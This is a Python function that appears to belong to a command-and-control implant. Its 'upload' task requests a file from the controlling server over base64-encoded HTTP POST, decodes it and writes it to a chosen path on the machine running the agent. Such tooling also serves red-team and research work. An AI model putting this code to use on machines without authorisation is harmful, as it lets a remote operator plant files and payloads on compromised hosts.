def upload(task_id, file_id, remote_path):
    global responses
    remote_path = remote_path.replace("\\", "")

    upload = {
        'action': "upload",
        'file_id': file_id,
        'chunk_size': 512000,
        'chunk_num': 1,
        'full_path': "",
        'task_id': task_id,
    }
    serialized = json.dumps(upload)

    message = to64(serialized)
    uuid = to64(agent.UUID)

    x = requests.post(agent.Server + agent.URI, data = uuid + message, headers=agent.UserAgent)
    
    res = from64(x.text)

    res = res['chunk_data']

    response_bytes = res.encode('utf-8')
    response_decode = base64.b64decode(response_bytes)
    code = response_decode.decode('utf-8')

    f = open(remote_path, "w")
    f.write(code)
    f.close()

    response = {
            'task_id': task_id,
            "user_output": "File Uploaded",
            'completed': True
        }
    responses.append(response)

    return